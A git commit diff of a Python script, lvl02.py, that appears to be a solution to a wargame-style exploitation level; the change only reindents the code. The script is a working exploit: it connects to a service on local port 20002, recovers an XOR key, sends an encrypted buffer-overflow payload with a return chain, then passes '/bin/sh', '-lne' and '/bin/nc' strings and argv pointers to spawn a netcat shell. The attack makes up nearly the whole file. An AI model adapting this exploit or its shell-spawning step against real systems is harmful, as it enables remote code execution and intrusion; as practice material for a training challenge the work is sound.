8de9a9ce21d7e604769daabda0c5fcdd7dde75ab
vldorl <vldorl@yandex.ru>
2016-12-17 16:31:59 +0300

    1

--- lvl02.py
+++ lvl02.py
@@ -28,43 +28,43 @@ PAYLOAD='E'+pack('I', blocksize)+"\x00"*blocksize
 KEYBUF=[]
 
 def cipher(message, length):
-global KEYBUF
-cipherd = []
-for i in xrange(0, length, 4):
-cipherd.append(unpack('I', message[i:i+4])[0]^KEYBUF[(i/4)%32])
-return cipherd
+	global KEYBUF
+	cipherd = []
+	for i in xrange(0, length, 4):
+		cipherd.append(unpack('I', message[i:i+4])[0]^KEYBUF[(i/4)%32])
+	return cipherd
 
 def main():
-global overflowedSize, blocksize, PAYLOAD, KEYBUF, chain
+	global overflowedSize, blocksize, PAYLOAD, KEYBUF, chain
 
 # Create connection & Send initial payload ??
-s = socket.create_connection(("127.0.0.1", 20002))
-s.sendall(PAYLOAD)
+	s = socket.create_connection(("127.0.0.1", 20002))
+	s.sendall(PAYLOAD)
 
 # Flush some garbage down the toilet (177 ascii + 4 size)
-s.recv(181, socket.MSG_WAITALL)
+	s.recv(181, socket.MSG_WAITALL)
 
 # retrieve the key, hashtag 1337cr4ck3r
-key=s.recv(128, socket.MSG_WAITALL)
-KEYBUF=[unpack('I',key[i:i+4])[0] for i in xrange(0, 128, 4)]
+	key=s.recv(128, socket.MSG_WAITALL)
+	KEYBUF=[unpack('I',key[i:i+4])[0] for i in xrange(0, 128, 4)]
 
 # Create a ciphered block of payload
-payload='A'*(overflowedSize)+chain
-ENCRYPTED_PAYLOAD='E'+pack('I', overflowedSize+len(chain))
-ENCRYPTED_PAYLOAD+=''.join(pack('I', x) for x in cipher(payload, len(payload))) # <- EZ
+	payload='A'*(overflowedSize)+chain
+	ENCRYPTED_PAYLOAD='E'+pack('I', overflowedSize+len(chain))
+	ENCRYPTED_PAYLOAD+=''.join(pack('I', x) for x in cipher(payload, len(payload))) # <- EZ
 
 # Vamos ala explotar!
-s.sendall(ENCRYPTED_PAYLOAD+"Q")
+	s.sendall(ENCRYPTED_PAYLOAD+"Q")
 # Wait for our payload to process
-time.sleep(0.5)
+	time.sleep(0.5)
 # send some strings with relevant binaries and arguments
-s.sendall('/bin/sh\x00-lne\x00/bin/nc\x00')
+	s.sendall('/bin/sh\x00-lne\x00/bin/nc\x00')
 # Cool people are late to the party
-time.sleep(0.5)
+	time.sleep(0.5)
 # send argv pointers
-s.sendall(pack('I', 0x804b471)+pack('I', 0x804b46c)+pack('I',0x804b464))
+	s.sendall(pack('I', 0x804b471)+pack('I', 0x804b46c)+pack('I',0x804b464))
 # All is well, Sayonara.
-s.close()
-return 0
+	s.close()
+	return 0
 
 exit(main())
